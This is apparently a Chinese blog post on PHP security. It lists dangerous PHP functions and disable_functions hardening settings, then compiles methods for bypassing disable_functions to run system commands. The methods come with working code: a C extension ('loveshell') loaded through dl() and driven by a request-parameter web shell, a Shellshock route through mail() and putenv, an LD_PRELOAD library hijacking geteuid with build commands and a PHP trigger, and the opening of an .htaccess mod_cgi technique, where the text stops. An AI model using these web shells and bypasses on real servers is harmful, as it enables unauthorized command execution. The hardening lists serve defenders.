class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">phpinfo() </span><br><span class="line">功能描述：输出 PHP 环境信息以及相关的模块、WEB 环境等信息。 </span><br><span class="line">危险等级：中 </span><br><span class="line"></span><br><span class="line">passthru() </span><br><span class="line">功能描述：允许执行一个外部程序并回显输出，类似于 exec()。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">exec() </span><br><span class="line">功能描述：允许执行一个外部程序（如 UNIX Shell 或 CMD 命令等）。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">system() </span><br><span class="line">功能描述：允许执行一个外部程序并回显输出，类似于 passthru()。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">chroot() </span><br><span class="line">功能描述：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式 </span><br><span class="line">PHP 时才能工作，且该函数不适用于 Windows 系统。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">scandir() </span><br><span class="line">功能描述：列出指定路径中的文件和目录。 </span><br><span class="line">危险等级：中 </span><br><span class="line"></span><br><span class="line">chgrp() </span><br><span class="line">功能描述：改变文件或目录所属的用户组。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">chown() </span><br><span class="line">功能描述：改变文件或目录的所有者。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">shell_exec() </span><br><span class="line">功能描述：通过 Shell 执行命令，并将执行结果作为字符串返回。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">proc_open() </span><br><span class="line">功能描述：执行一个命令并打开文件指针用于读取以及写入。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">proc_get_status() </span><br><span class="line">功能描述：获取使用 proc_open() 所打开进程的信息。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">error_log() </span><br><span class="line">功能描述：将错误信息发送到指定位置（文件）。 </span><br><span class="line">安全备注：在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode， </span><br><span class="line">执行任意命令。 </span><br><span class="line">危险等级：低 </span><br><span class="line"></span><br><span class="line">ini_alter() </span><br><span class="line">功能描述：是 ini_set() 函数的一个别名函数，功能与 ini_set() 相同。 </span><br><span class="line">具体参见 ini_set()。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">ini_set() </span><br><span class="line">功能描述：可用于修改、设置 PHP 环境配置参数。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">ini_restore() </span><br><span class="line">功能描述：可用于恢复 PHP 环境配置参数到其初始值。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">dl() </span><br><span class="line">功能描述：在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">pfsockopen() </span><br><span class="line">功能描述：建立一个 Internet 或 UNIX 域的 socket 持久连接。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">syslog() </span><br><span class="line">功能描述：可调用 UNIX 系统的系统层 syslog() 函数。 </span><br><span class="line">危险等级：中 </span><br><span class="line"></span><br><span class="line">readlink() </span><br><span class="line">功能描述：返回符号连接指向的目标文件内容。 </span><br><span class="line">危险等级：中 </span><br><span class="line"></span><br><span class="line">symlink() </span><br><span class="line">功能描述：在 UNIX 系统中建立一个符号链接。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">popen() </span><br><span class="line">功能描述：可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">stream_socket_server() </span><br><span class="line">功能描述：建立一个 Internet 或 UNIX 服务器连接。 </span><br><span class="line">危险等级：中 </span><br><span class="line"></span><br><span class="line">putenv() </span><br><span class="line">功能描述：用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数 </span><br><span class="line">修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。 </span><br><span class="line">危险等级：高</span><br></pre></td></tr></table></figure><br><p><strong>禁用方法</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/php.iniIIS 在 c:\windows\php.ini</span><br><span class="line">查找到 disable_functions ，添加需禁用的函数名，如下： </span><br><span class="line">phpinfo,eval,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen</span><br><span class="line"># 重启 HTTP 服务即可</span><br></pre></td></tr></table></figure><p><strong>一些推荐的 disable_functions 设置</strong></p><p>如果在使用过程中出现 php 不支持部分功能的现象，可以搜索下错误提示，去掉相应的函数即可。 支持的越多越不安全，对于采集程序来说需要去掉curl_exec。</p><p>参考设置1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions=exec,system,passthru,popen,pclose,shell_exec,proc_open,dl,chmod,gzinflate,set_time_limit</span><br></pre></td></tr></table></figure><p>参考设置2：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions=phpinfo,exec,system,passthru,popen,pclose,shell_exec,proc_open,dl,curl_exec,multi_exec,chmod,gzinflate,set_time_limit</span><br></pre></td></tr></table></figure><br><p><strong>如果突破 disable_functions 的思路：</strong></p><p>[ 从 jb51 整理 ] : <code>https://www.jb51.net/article/139230.htm</code></p><p>大部分的服务器都对PHP做了严格的限制，包括使用 open_basedir 限制可以操作的目录以及使用 disable_functions 限制程序使用一些可以直接执行系统命令的函数如 system，exec，passthru，shell_exec，proc_open 等等。但是如果服务器没有对dl()函数做限制，一样可以利用 dl() 函数饶过这些限制：</p><p>dl() 函数允许在 php 脚本里动态加载 php 模块，默认是加载 extension_dir 目录里的扩展，该选项是 PHP_INI_SYSTEM 范围可修改的，只能在 php.ini 或者 apache 主配置文件里修改。当然，你也可以通过 <code>enable_dl</code> 选项来关闭动态加载功能，而这个选项默认为 On 的，事实上也很少人注意到这个。dl( ) 函数在设计时存在安全漏洞，可以用 ../ 这种目录遍历的方式指定加载任何一个目录里的 so 等扩展文件，extension_dir 限制可以被随意饶过。所以我们可以上传自己的 so 文件，并且用 dl 函数加载这个 so 文件然后利用 so 文件里的函数执行其他操作，包括系统命令。</p><p>so 文件部分内容（下文的 C 代码，由于本人没有编写过 PHP 模块的原因，没咋看懂，慎用，特此记录留待日后查看）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">--------- part <span class="number">1</span> ----------</span><br><span class="line">    </span><br><span class="line">PHP_FUNCTION(dl) </span><br><span class="line">&#123; </span><br><span class="line">pval **file; </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> ZTS </span></span><br><span class="line"><span class="keyword">if</span> ((<span class="built_in">strncmp</span>(sapi_module.name, <span class="string">"cgi"</span>, <span class="number">3</span>)!=<span class="number">0</span>) &amp;&amp; </span><br><span class="line">(<span class="built_in">strcmp</span>(sapi_module.name, <span class="string">"cli"</span>)!=<span class="number">0</span>) &amp;&amp; </span><br><span class="line">(<span class="built_in">strncmp</span>(sapi_module.name, <span class="string">"embed"</span>, <span class="number">5</span>)!=<span class="number">0</span>)) </span><br><span class="line">&#123; </span><br><span class="line">php_error_docref(<span class="literal">NULL</span> TSRMLS_CC, E_WARNING, <span class="string">"Not supported in multithreaded Web servers - use extension statements in your php.ini"</span>); </span><br><span class="line">RETURN_FALSE; </span><br><span class="line">&#125; <span class="comment">//验证是否可以使用dl函数，在多线程web服务器里是禁止的 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* obtain arguments */</span> </span><br><span class="line"><span class="keyword">if</span> (ZEND_NUM_ARGS() != <span class="number">1</span> || zend_get_parameters_ex(<span class="number">1</span>, &amp;file) == FAILURE) &#123; </span><br><span class="line">WRONG_PARAM_COUNT; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">convert_to_string_ex(file); <span class="comment">//取得参数 </span></span><br><span class="line"><span class="keyword">if</span> (!PG(enable_dl)) &#123; </span><br><span class="line">php_error_docref(<span class="literal">NULL</span> TSRMLS_CC, E_WARNING, <span class="string">"Dynamically loaded extentions aren't enabled"</span>);<span class="comment">//验证是否enable_dl，默认为on </span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (PG(safe_mode)) &#123; </span><br><span class="line">php_error_docref(<span class="literal">NULL</span> TSRMLS_CC, E_WARNING, <span class="string">"Dynamically loaded extensions aren't allowed when running in Safe Mode"</span>);<span class="comment">//验证是否safe_mode打开 </span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">php_dl(*file, MODULE_TEMPORARY, return_value TSRMLS_CC); <span class="comment">//开始调用加载 </span></span><br><span class="line">EG(full_tables_cleanup) = <span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--------- part <span class="number">2</span> ----------</span><br><span class="line">处理模块的加载 :</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">php_dl</span><span class="params">(pval *file, <span class="keyword">int</span> type, pval *return_value TSRMLS_DC)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">void</span> *handle; </span><br><span class="line"><span class="keyword">char</span> *libpath; </span><br><span class="line">zend_module_entry *module_entry, *tmp; </span><br><span class="line">zend_module_entry *(*get_module)(<span class="keyword">void</span>); </span><br><span class="line"><span class="keyword">int</span> error_type; </span><br><span class="line"><span class="keyword">char</span> *extension_dir; <span class="comment">//定义一些变量 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (type==MODULE_PERSISTENT) &#123; </span><br><span class="line"><span class="comment">/* Use the configuration hash directly, the INI mechanism is not yet initialized */</span> </span><br><span class="line"><span class="keyword">if</span> (cfg_get_string(<span class="string">"extension_dir"</span>, &amp;extension_dir)==FAILURE) &#123; </span><br><span class="line">extension_dir = PHP_EXTENSION_DIR; </span><br><span class="line">&#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">extension_dir = PG(extension_dir); </span><br><span class="line">&#125; <span class="comment">//取得php.ini里的设置也就是extension_dir的目录 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (type==MODULE_TEMPORARY) &#123; </span><br><span class="line">error_type = E_WARNING; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">error_type = E_CORE_WARNING; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (extension_dir &amp;&amp; extension_dir[<span class="number">0</span>])&#123; </span><br><span class="line"><span class="keyword">int</span> extension_dir_len = <span class="built_in">strlen</span>(extension_dir); </span><br><span class="line">libpath = emalloc(extension_dir_len+Z_STRLEN_P(file)+<span class="number">2</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_SLASH(extension_dir[extension_dir_len<span class="number">-1</span>])) &#123; </span><br><span class="line"><span class="built_in">sprintf</span>(libpath, <span class="string">"%s%s"</span>, extension_dir, Z_STRVAL_P(file)); <span class="comment">/* SAFE */</span> </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line"><span class="built_in">sprintf</span>(libpath, <span class="string">"%s%c%s"</span>, extension_dir, DEFAULT_SLASH, Z_STRVAL_P(file)); <span class="comment">/* SAFE */</span> </span><br><span class="line">&#125; <span class="comment">//构造最终的so文件的位置，只是简单的附加，并没有对传入的参数做任何检查，包括open_basedir等 </span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">libpath = estrndup(Z_STRVAL_P(file), Z_STRLEN_P(file)); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* load dynamic symbol */</span> </span><br><span class="line">handle = DL_LOAD(libpath); <span class="comment">//开始真正的调用了 </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--------- part <span class="number">3</span> ----------</span><br><span class="line">编写导出函数 loveshell</span><br><span class="line">PHP_FUNCTION(loveshell) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">char</span> *command; </span><br><span class="line"><span class="keyword">int</span> command_len; </span><br><span class="line"><span class="keyword">if</span> (ZEND_NUM_ARGS() != <span class="number">1</span> || \</span><br><span class="line">        zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC,<span class="string">"s"</span>, \</span><br><span class="line">                              &amp;command, &amp;command_len) == FAILURE) &#123; </span><br><span class="line">WRONG_PARAM_COUNT; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">system(command); </span><br><span class="line">zend_printf(<span class="string">"I recieve %s"</span>,command); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试代码 ( PHP )：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">dl(<span class="string">'../../../../../../../../../www/users/www.cnbct.org/loveshell.so'</span>); </span><br><span class="line">$cmd=$_REQUEST[c].<span class="string">" 2&gt;&amp;1&gt;tmp.txt"</span>; </span><br><span class="line">loveshell($cmd); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>; </span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">'tmp.txt'</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由于 php4 和 php5 的结构不一样，所以如果想要能顺利调用扩展，那么在 php4 环境下就要将上面的代码放到 php4 环境下编译，php5 的就要在 php5 环境下编译。我们将编写好的扩展上传到服务器，就可以利用上面的代码执行命令了。</p><br><p><strong>Bypass disable_functions 执行系统命令总结二</strong></p><p><strong>一、为什么要bypass disable functions</strong></p><p>为了安全起见，很多运维人员会禁用PHP的一些“危险”函数，例如eval、exec、system等，将其写在php.ini配置文件中，就是我们所说的disable functions了，特别是虚拟主机运营商，为了彻底隔离同服务器的客户，以及避免出现大面积的安全问题，在disable functions的设置中也通常较为严格。</p><p>攻与防是对立的，也是互相补充的，既然有对函数的禁用措施，就会有人想方设法的去突破这层限制，我们只有在掌握突破方式以及原理的基础之上，才能更好的去防范这类攻击。</p><p>执行系统命令通常是攻击者拿到网站webshell之后想要进一步动作的必然操作，如若不能执行系统命令，接下来的更深入的攻击将很难继续，所以就有了网站管理者禁用类似exec、system之类函数的现象。然而随着技术的不断进步，不断有新的思路出现，单纯的禁用这些函数，某些情况下已经不能阻止攻击者达到执行系统命令的目的了，那么攻击者用什么样的方式突破了disable functions呢？我们又怎样防范这样的攻击呢？</p><p><strong>二、 Bash漏洞导致的任意命令执行</strong></p><p>GNU Bash 环境变量远程命令执行漏洞（CVE-2014-6271）是GNU Bash 的一个远程代码执行漏洞，在这个CVE的介绍中，可以看到这样的描述：“GNU Bash 4.3及之前版本中存在安全漏洞，该漏洞源于程序没有正确处理环境变量值内的函数定义。远程攻击者可借助特制的环境变量利用该漏洞执行任意代码。以下产品和模块可能会被利用：OpenSSH sshd中的ForceCommand功能，Apache HTTP Server中的mod_cgi和mod_cgid模块，DHCP客户端等”。实际上，PHP也可以利用这个漏洞做很多事情，甚至有可能直接在80导致远程命令执行。关于这个漏洞的详细情况可以查阅CVE-2014-6271的相关资料，此处不再赘述。</p><p>下面我们来看一下PHP到底什么地方能用到bash的这个漏洞呢？其实可以用的地方不止一处，这里我们以mail函数作为例子，其他地方同理，可以自行分析。</p><p>PHP的mail函数提供了3个必选参数和2个可选参数，这里我们主要看最后一个参数，PHP官方手册上对最后一个参数的说明：</p><blockquote><p>“Theadditional_parameters parameter can be used to pass an additional parameter tothe program configured to use when sending mail using the sendmail_pathconfiguration setting. For example, this can be used to set the envelope senderaddress when using sendmail with the -f sendmail option.<br>Theuser that the webserver runs as should be added as a trusted user to thesendmail configuration to prevent a ‘X-Warning’ header from being added to themessage when the envelope sender (-f) is set using this method. For sendmailusers, this file is /etc/mail/trusted-users. “</p></blockquote><p>简单的说就是这个参数可以通过添加附加的命令作为发送邮件时候的配置，比如使用-f参数可以设置邮件发件人等，官方文档在范例Example #3也有所演示，具体可以参考官方文档：<code>http://php.net/manual/zh/function.mail.php</code>。</p><p>在 mail 函数的源代码mail.c中，我们可以找到如下代码片段：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (extra_cmd != <span class="literal">NULL</span>) &#123;</span><br><span class="line">       spprintf(&amp;sendmail_cmd, <span class="number">0</span>,<span class="string">"%s %s"</span>, sendmail_path, extra_cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       sendmail_cmd = sendmail_path;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果传递了第五个参数（extra_cmd），则用spprintf将sendmail_path和extra_cmd拼接到sendmail_cmd中（其中sendmail_path就是php.ini中的sendmail_path配置项），随后将sendmail_cmd丢给popen执行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PHP_WIN32</span></span><br><span class="line">    sendmail = popen_ex(sendmail_cmd,<span class="string">"wb"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span> TSRMLS_CC);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="comment">/* Since popen() doesn't indicate if theinternal fork() doesn't work</span></span><br><span class="line"><span class="comment">    *(e.g. the shell can't be executed) we explicitly set it to 0 to be</span></span><br><span class="line"><span class="comment">    *sure we don't catch any older errno value. */</span></span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    sendmail = popen(sendmail_cmd,<span class="string">"w"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>如果系统默认sh是bash，popen会派生bash进程，而我们刚才提到的CVE-2014-6271漏洞，直接就导致我们可以利用mail()函数执行任意命令，绕过disable_functions的限制。但是这里其实有一个问题，就是extra_cmd在spprintf之前做了安全检查，我当前的PHP版本是最新的7.2.4，代码位置在mail.c的第371-375行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (force_extra_parameters) &#123;</span><br><span class="line">       extra_cmd =php_escape_shell_cmd(force_extra_parameters);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (extra_cmd) &#123;</span><br><span class="line">       extra_cmd =php_escape_shell_cmd(ZSTR_VAL(extra_cmd));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php_escape_shell_cmd函数会对特殊字符（包括&amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A and \xFF. ‘ 等）进行转义，那这样是不是就没办法了呢？不是的，我们可以通过putenv函数来设置一个包含自定义函数的环境变量，然后通过mail函数来触发，网上早已有POC。</p><p>同样调用popen派生进程的php函数还有imap_mail，或者还可能有其他的我们没有发现的函数，所以如果要防范这类攻击，最好的办法就是从根源上入手，修复CVE-2014-6271这个bash漏洞。</p><p><strong>三、LD_PRELOAD：无需bash漏洞</strong></p><p>上文说到mail函数利用bash破壳漏洞可以实现突破disable functions的限制执行系统命令，但是像这样的漏洞，一般安全意识稍好一点的运维人员，都会打上补丁了，那么是不是打上补丁之后就一定安全了呢？显然答案是否定的，LD_PRELOAD是Linux系统的下一个有趣的环境变量：</p><p>“ 它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。”</p><p>它允许你定义在程序运行前优先加载的动态链接库，我们只要知道这一件事就足够了，这说明什么？这说明我们几乎可以劫持PHP的大部分函数，还拿上文的mail函数作为例子，上文说过，php的mail函数实际上是调用了系统的sendmail命令，那么我们来看一下sendmail都调用了哪些库函数：</p><p>—— 此处 略去一张图 —— [ 因为我的系统中是没有 sendmail 命令的… ] ，日后如想要测试该功能，可使用 <code>readelf -Ws /usr/sbin/sendmail</code> 来查看缺失的图的内容。</p><p>发现sendmail函数在运行过程动态调用了很多标准库函数，我们从中随便选取一个库函数geteuid进行测试。首先我们编写一个自己的动态链接程序，hack.c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"touch/var/www/html/test"</span>);</span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当这个共享库中的geteuid被调用时，尝试加载payload()函数，执行命令，在/var/www/html目录下创建一个名字为test的文件。这里实际应用时应该注意编译平台和目标尽量相近，以及注意路径问题，避免不必要的麻烦，这里我们仅仅作为测试，不考虑这些问题。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> gcc -c -fPIC hack.c -o hack</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> gcc -shared hack -o hack.so</span></span><br></pre></td></tr></table></figure><p>我们把hack.so放到WEB目录，然后编写一个PHP文件进行测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=/var/www/html/hack.so"</span>);</span><br><span class="line">mail(<span class="string">"[email protected]"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们的/var/www/html/目录下本来只有hack.so和index.php这两个文件，当我们在浏览器中访问index.php页面之后，可以看到目录下又多出了一个test文件，说明我们的系统命令执行成功。（原作测试环境：VMPlayer7+CentOS7+Apache2.4+PHP7.2.4）</p><p>这种绕过行为实施起来很简单，并且目前为止还不受PHP与Linux版本的限制，但是也很容易防御，只要禁用相关的函数（putenv）或者限制对环境变量的传递就可以了，但是要注意对现有业务是否造成影响。</p><p><strong>四、.htaccess：不止重定向</strong></p><p>大家对.htaccess文件一定不陌生，没错，在apache的WEB环境中，我们经常会使用.htaccess这个文件来确定某个目录下的URL重写规则，特别是一些开源的CMS或者框架当中经常会用到，比如著名的开源论坛discuz!，就可以通过.htaccess文件实现URL的静态化，大部分PHP框架，例如ThinkPHP和Laravel，在apache环境下会用.htaccess文件实现路由规则。但是如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令。</p><p>关于mode_cgi，可以参考apache的官方说明：  <a href="http://man.chinaunix.net/newsoft/ApacheManual/mod/mod_cgi.html" target="_blank" rel="noopener">http://man.chinaunix.net/newsoft/ApacheManual/mod/mod_cgi.html</a> 。</p><p>“任何具有mime类型application/x-httpd-cgi或者被 cgi-script处理器(Apache 1.1或以后版本)处理的文件将被作为CGI脚本对待并由服务器运行, 它的输出将被返回给客户端。通过两种途径使文件成为CGI脚本，或者文件具有已由 AddType指令定义的扩展名，或者文件位于 ScriptAlias目录中。”，这就表示，apache允许WEB服务器与可执行文件进行交互，这就意味着，你可以用C或者python编写WEB应用，听起来我们好像可以做任何apache权限用户能做的事情了，那么到底如何实现呢？</p><p>首先需要满足几个条件，第一，必须是apache环境，第二，mod_cgi已经启用（在我的环境下是默认启用的），第三，必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none，第四，必须有权限写.htaccess文件。其实这几个条件还是比较容易满足的，满足了以上的条件，就可以“搞事情”了。</p><p>在apache的配置中，有一个非常重要的指令，Options，Options指令是Apache配置文件中一个比较常见也比较重要的指令，Options指令可以在Apache服务器核心配置(server config)、虚拟主机配置(virtual host)、特定目录配置(directory)以及.htaccess文件中使用。Options指令的主要作用是控制特定目录将启用哪些服务器特性。关于Options指令后可以附加的特性选项的具体作用及含义，可以参考这篇文章： <a href="http://www.365mini.com/page/apache-options-directive.htm" target="_blank" rel="noopener">http://www.365mini.com/page/apache-options-directive.htm</a> ，当然我们用到的就是ExecCGI选项，表示允许使用mod_cgi模块执行CGI脚本。除了Options，我们还要配合另外一个AddHandler指令来使用，如果你对AddHandler不太熟悉没关系，这么解释一下就容易理解多了：AddType我们肯定很熟悉，比如配置apache对PHP的支持的时候，经常会添加一行类似AddTypeapplication/x-httpd-php 